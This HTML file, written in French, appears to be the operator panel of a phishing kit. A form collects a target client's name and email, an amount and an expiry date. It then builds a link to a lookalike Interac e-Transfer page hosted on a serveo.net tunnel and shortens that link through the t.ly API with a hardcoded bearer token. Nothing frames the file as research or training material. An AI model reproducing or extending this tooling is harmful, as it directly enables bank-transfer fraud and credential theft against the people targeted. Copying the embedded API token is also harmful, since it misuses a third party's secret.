<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulaire d'envoi vers autres</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f4f4f4;
        }
        .container {
            max-width: 600px;
            margin: auto;
            padding: 20px;
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 {
            margin-top: 0;
        }
        label {
            display: block;
            margin: 10px 0 5px;
        }
        input[type="text"],
        input[type="url"] {
            width: 100%;
            padding: 8px;
            margin-bottom: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            padding: 10px 20px;
            background-color: #007BFF;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Virement Autres</h1>
        <form action="process.php" method="post">
            <label for="client">Nom du Client:</label>
            <input type="text" id="client" name="client" required>

            <label for="email">Email du Client:</label>
            <input type="text" id="email" name="email" required>

            <label for="myname">Votre Nom:</label>
            <input type="text" id="myname" name="myname" required>

            <label for="montant">Montant:</label>
            <input type="text" id="montant" name="montant" required>

            <label for="exp">Date d'Expiration:</label>
            <input type="text" id="exp" name="exp" required>

            <label for="url">URL:</label>
            <input type="url" id="url" name="url" required>

            <button type="button" onclick="generateLink()">Générer le Lien</button>
            <button type="button" onclick="shortenLink()">Raccourcir le Lien</button>

            <button type="submit">Envoyer</button>
        </form>
    </div>

    <script>
        function generateLink() {
            var client = document.getElementById('client').value;
            var montant = document.getElementById('montant').value;
            var myname = document.getElementById('myname').value;
            var exp = document.getElementById('exp').value;
            var baseUrl = 'https://canadainteracsecure.serveo.net//interac.php?';
            var url = baseUrl + 'montant=' + encodeURIComponent(montant) + '&exp=' + encodeURIComponent(exp) + '&nom=' + encodeURIComponent(myname);

            document.getElementById('url').value = url;
        }

        async function shortenLink() {
            // Informations de l'API
            const apiUrl = "https://api.t.ly/api/v1/link/shorten";
            const apiToken = "7LvCbVaQYR6durZcMHvqsTQpCXQNLXinXJPz5jeoF95rkTQVnM1AaSjPHbEN";

            // Données à envoyer à l'API
            const data = {
                long_url: document.getElementById('url').value,
                domain: "https://t.ly/",
                expire_at_datetime: "2035-01-17 15:00:00",
                description: "Lien personnalisé",
                public_stats: true
                // Suppression de "meta" pour éviter la redirection conditionnelle
            };

            try {
                // Requête `fetch` pour raccourcir le lien
                const response = await fetch(apiUrl, {
                    method: "POST",
                    headers: {
                        "Authorization": `Bearer ${apiToken}`,
                        "Content-Type": "application/json",
                        "Accept": "application/json"
                    },
                    body: JSON.stringify(data)
                });

                // Conversion de la réponse en JSON
                const result = await response.json();

                // Vérification du résultat
                if (response.ok) {
                    // Afficher le lien raccourci
                    alert('Lien raccourci : ' + result.short_url);
                    document.getElementById('url').value = result.short_url;
                } else {
                    // Afficher les erreurs
                    alert('Erreur : ' + result.message);
                }
            } catch (error) {
                // Affichage des erreurs réseau
                alert('Erreur lors de la requête : ' + error.message);
            }
        }
    </script>
</body>
</html>
